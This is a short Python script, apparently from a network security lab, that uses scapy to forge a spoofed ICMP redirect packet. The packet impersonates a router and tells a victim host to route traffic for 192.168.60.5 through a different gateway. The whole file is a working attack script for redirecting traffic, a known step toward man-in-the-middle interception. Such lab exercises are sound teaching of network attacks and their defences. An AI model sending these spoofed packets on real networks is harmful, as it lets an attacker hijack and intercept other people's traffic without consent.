#!/usr/bin/python3

from scapy.all import *
from scapy.layers.inet import IP, ICMP

ip = IP(src="10.9.0.11", dst="10.9.0.5")
icmp = ICMP(type=5, code=1)
icmp.gw = "153.10.1.36"

# The enclosed IP packet should be the one that
# triggers the redirect message.
ip2 = IP(src='10.9.0.5', dst='192.168.60.5')

send(ip / icmp / ip2 / ICMP())
